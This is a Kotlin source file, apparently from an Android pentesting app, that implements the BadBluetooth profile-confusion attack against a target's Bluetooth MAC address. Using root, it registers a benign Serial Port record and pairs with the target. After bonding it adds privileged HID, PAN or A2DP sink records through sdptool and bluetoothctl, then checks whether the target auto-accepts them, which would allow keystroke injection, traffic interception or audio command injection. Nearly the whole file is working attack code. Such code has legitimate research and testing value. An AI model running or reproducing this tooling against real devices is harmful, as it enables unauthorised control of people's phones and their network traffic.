package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Modes of operation for the BadBluetooth (Profile Confusion) attack.
 *
 * Each mode adds a different privileged Bluetooth profile after an initial
 * pairing with a benign profile, testing whether the target auto-accepts
 * the new profile without user re-authorization.
 *
 * Based on: Lu et al., "BadBluetooth: Breaking Android Security Mechanisms
 * via Malicious Bluetooth Peripherals" (NDSS 2019).
 */
enum class ProfileConfusionMode(val description: String) {
    ADD_HID_PROFILE("Add HID (keyboard/mouse) profile post-bonding for keystroke injection"),
    ADD_PAN_PROFILE("Add PAN (network) profile post-bonding for network MITM"),
    ADD_AUDIO_PROFILE("Add audio profile post-bonding for voice-assistant hijacking")
}

/**
 * Implementation of the BadBluetooth (Profile Confusion / Impersonation) attack.
 *
 * This module targets the Bluetooth SDP (Service Discovery Protocol) profile
 * registration mechanism in BR/EDR. A malicious peripheral advertises benign
 * profiles during initial pairing, then after bonding succeeds it adds
 * privileged profiles (HID keyboard, PAN, audio) without triggering user
 * re-authorization on the target device.
 *
 * If the target auto-connects to the newly added profile, it is vulnerable
 * to keystroke injection (HID), network MITM (PAN), or voice-assistant
 * hijacking (audio).
 *
 * The module first checks for a dedicated native binary (`badbluetooth`).
 * If that binary is not present, it falls back to sdptool/bluetoothctl to
 * register SDP records and manipulate profiles. The fallback registers a
 * benign SDP record, initiates pairing with the target, waits for bonding
 * to succeed, then adds a privileged SDP record and checks whether the
 * target auto-connects to the new profile without a user prompt.
 *
 * Root is required for all approaches (SDP record manipulation, bluetoothctl
 * access). All privileged operations are executed through [RootExecutor].
 */
class BadBluetoothModule {

    companion object {
        private const val TAG = "BadBluetoothModule"
        private const val BADBLUETOOTH_BINARY_PATH = "/data/local/tmp/badbluetooth"

        /**
         * UUID for the Serial Port Profile (SPP), used as the benign profile
         * during initial pairing. SPP is a low-privilege profile that most
         * targets accept without special authorization.
         */
        private const val SPP_UUID = "00001101-0000-1000-8000-00805F9B34FB"

        /**
         * UUID for the Human Interface Device (HID) profile. Adding this
         * post-bonding enables keystroke injection if the target auto-accepts.
         */
        private const val HID_UUID = "00001124-0000-1000-8000-00805F9B34FB"

        /**
         * UUID for the Personal Area Network User (PANU) profile. Adding
         * this post-bonding enables network MITM if the target auto-accepts.
         */
        private const val PAN_UUID = "00001115-0000-1000-8000-00805F9B34FB"

        /**
         * UUID for the Advanced Audio Distribution Profile (A2DP) sink.
         * Adding this post-bonding enables audio hijacking if the target
         * auto-accepts.
         */
        private const val AUDIO_UUID = "0000110B-0000-1000-8000-00805F9B34FB"
    }

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Executes the BadBluetooth attack workflow against the target device.
     *
     * The flow:
     * 1. Verify root access (required, no simulation fallback)
     * 2. Check if the native badbluetooth binary exists
     * 3. If it exists, run it with the specified mode
     * 4. Otherwise, use sdptool/bluetoothctl to register profiles and test
     *
     * @param targetDevice The Bluetooth device to attack.
     * @param mode The specific profile confusion variant to use.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice, mode: ProfileConfusionMode): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting BadBluetooth (Profile Confusion) attack on ${targetDevice.name ?: mac} using mode $mode")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("BadBluetooth requires root for SDP record manipulation. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $BADBLUETOOTH_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native badbluetooth binary
            emit("Native badbluetooth binary found at $BADBLUETOOTH_BINARY_PATH")
            emit("Executing: $BADBLUETOOTH_BINARY_PATH -t $mac -m ${mode.name}")

            val output = RootExecutor.execute("$BADBLUETOOTH_BINARY_PATH -t $mac -m ${mode.name}")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("badbluetooth execution failed.")
            } else {
                emit("badbluetooth execution completed.")
            }
        } else {
            // Fallback: use sdptool/bluetoothctl to manipulate profiles
            emit("Native binary not found at $BADBLUETOOTH_BINARY_PATH")
            emit("Falling back to sdptool/bluetoothctl-based approach...")

            executeSdptoolApproach(mac, mode)
        }
    }

    /**
     * Uses sdptool and bluetoothctl to register a benign SDP record, pair
     * with the target, then add a privileged profile post-bonding and check
     * whether the target auto-connects to the new profile without user
     * re-authorization.
     *
     * Steps:
     *   1. Register a benign SDP record (SPP) to appear harmless.
     *   2. Initiate pairing with the target via bluetoothctl.
     *   3. Wait for bonding to succeed and verify bond state.
     *   4. Add a privileged SDP record (HID/PAN/Audio) based on [mode].
     *   5. Check if the target auto-connects to the new profile.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeSdptoolApproach(
        mac: String,
        mode: ProfileConfusionMode
    ) {
        // Step 1: Register a benign SDP record (Serial Port Profile)
        emit("Step 1: Registering benign SDP record (Serial Port Profile)...")
        val sppResult = RootExecutor.execute("sdptool add --channel=3 SP")
        if (sppResult.startsWith("Error")) {
            emit("Failed to register SPP record: $sppResult")
            emit("sdptool may not be available on this device. Aborting.")
            return
        }
        emit("SPP record registered: ${sppResult.ifBlank { "OK" }}")

        // Step 2: Initiate pairing with the target
        emit("Step 2: Initiating pairing with $mac via bluetoothctl...")
        val pairResult = RootExecutor.execute(
            "echo -e 'pair $mac\\nyes\\n' | timeout 15 bluetoothctl"
        )
        for (line in pairResult.lines()) {
            if (line.isNotBlank()) {
                emit("  $line")
            }
        }

        // Step 3: Verify bonding state
        emit("Step 3: Verifying bonding state...")
        val bondResult = RootExecutor.execute(
            "echo -e 'info $mac\\n' | bluetoothctl"
        )
        val isBonded = bondResult.contains("Paired: yes", ignoreCase = true) ||
                bondResult.contains("Bonded: yes", ignoreCase = true)

        if (!isBonded) {
            emit("Pairing did not complete. Bond state not confirmed.")
            emit("The target may have rejected pairing or is out of range.")
            emit("Continuing to attempt profile addition regardless...")
        } else {
            emit("Bonding confirmed with $mac.")
        }

        // Step 4: Add the privileged SDP record based on mode
        emit("Step 4: Adding privileged profile post-bonding (${mode.name})...")
        val (profileCmd, profileName, profileUuid) = when (mode) {
            ProfileConfusionMode.ADD_HID_PROFILE -> {
                Triple(
                    "sdptool add --channel=11 HID",
                    "HID (Human Interface Device)",
                    HID_UUID
                )
            }
            ProfileConfusionMode.ADD_PAN_PROFILE -> {
                Triple(
                    "sdptool add --channel=15 NAP",
                    "PAN (Personal Area Network)",
                    PAN_UUID
                )
            }
            ProfileConfusionMode.ADD_AUDIO_PROFILE -> {
                Triple(
                    "sdptool add --channel=13 A2SNK",
                    "A2DP Audio Sink",
                    AUDIO_UUID
                )
            }
        }

        emit("Registering $profileName SDP record...")
        val profileResult = RootExecutor.execute(profileCmd)
        if (profileResult.startsWith("Error")) {
            emit("Failed to register $profileName record: $profileResult")
            emit("The profile may not be supported by this sdptool version.")
        } else {
            emit("$profileName record registered: ${profileResult.ifBlank { "OK" }}")
        }

        // Step 5: Check if the target auto-connects to the new profile
        emit("Step 5: Checking if target auto-connects to $profileName...")
        emit("Querying active connections to $mac...")

        val connCheckResult = RootExecutor.execute(
            "echo -e 'info $mac\\n' | bluetoothctl"
        )

        // Look for connection and service indicators
        val isConnected = connCheckResult.contains("Connected: yes", ignoreCase = true)
        val hasNewService = connCheckResult.contains(profileUuid, ignoreCase = true)

        evaluateProfileConfusion(mac, mode, profileName, isBonded, isConnected, hasNewService)

        // Step 6: Browse SDP records on target to verify profile visibility
        emit("--- Browsing SDP records on target ---")
        val browseResult = RootExecutor.execute("sdptool browse $mac")
        if (browseResult.startsWith("Error") || browseResult.isBlank()) {
            emit("SDP browse unavailable or returned no results.")
        } else {
            val recordCount = browseResult.lines().count { it.contains("Service Name:", ignoreCase = true) }
            emit("$recordCount SDP service records found on target.")
            // Emit relevant lines from the SDP browse
            for (line in browseResult.lines()) {
                if (line.contains("Service Name:", ignoreCase = true) ||
                    line.contains("Profile Descriptor", ignoreCase = true) ||
                    line.contains(profileUuid, ignoreCase = true)
                ) {
                    emit("  $line")
                }
            }
        }

        // Cleanup: remove the SDP records we added
        emit("--- Cleanup ---")
        emit("Removing registered SDP records...")
        val cleanupResult = RootExecutor.execute("sdptool del 0x10003; sdptool del 0x10004")
        emit("Cleanup result: ${cleanupResult.ifBlank { "OK (records removed)" }}")
    }

    /**
     * Evaluates the result of the profile confusion attempt and emits
     * appropriate findings.
     *
     * A successful attack means the target auto-connected to the new
     * privileged profile without user re-authorization, indicating that
     * the device trusts all profiles from a bonded peer regardless of
     * what was originally authorized.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.evaluateProfileConfusion(
        mac: String,
        mode: ProfileConfusionMode,
        profileName: String,
        isBonded: Boolean,
        isConnected: Boolean,
        hasNewService: Boolean
    ) {
        when {
            isBonded && isConnected && hasNewService -> {
                emit("VULNERABILITY CONFIRMED: Target auto-accepted $profileName profile.")
                emit("The target connected to the privileged profile without user " +
                        "re-authorization after initial bonding with a benign profile.")
                when (mode) {
                    ProfileConfusionMode.ADD_HID_PROFILE ->
                        emit("Impact: Keystroke injection is possible. An attacker can " +
                                "type arbitrary input on the target device.")
                    ProfileConfusionMode.ADD_PAN_PROFILE ->
                        emit("Impact: Network MITM is possible. An attacker can route " +
                                "the target's network traffic through a controlled interface.")
                    ProfileConfusionMode.ADD_AUDIO_PROFILE ->
                        emit("Impact: Voice-assistant hijacking is possible. An attacker " +
                                "can inject audio commands via the A2DP channel.")
                }
                Log.w(TAG, "BadBluetooth profile confusion confirmed on $mac: $profileName")
            }
            isBonded && isConnected -> {
                emit("Target is bonded and connected but $profileName service UUID not " +
                        "detected in the active connection info.")
                emit("The profile may have been accepted but is not actively in use, or " +
                        "the detection method could not confirm it. Manual verification " +
                        "recommended.")
            }
            isBonded && !isConnected -> {
                emit("Target is bonded but not currently connected.")
                emit("The privileged profile was registered but the target has not " +
                        "auto-connected to it. This may indicate the target requires " +
                        "user authorization for new profiles, or the target is not " +
                        "actively seeking connections.")
                emit("The target may still be vulnerable on next connection attempt.")
            }
            else -> {
                emit("Bonding was not confirmed. Cannot determine profile confusion " +
                        "susceptibility without an established trust relationship.")
                emit("Retry after ensuring the target is in range and pairable.")
            }
        }
    }
}
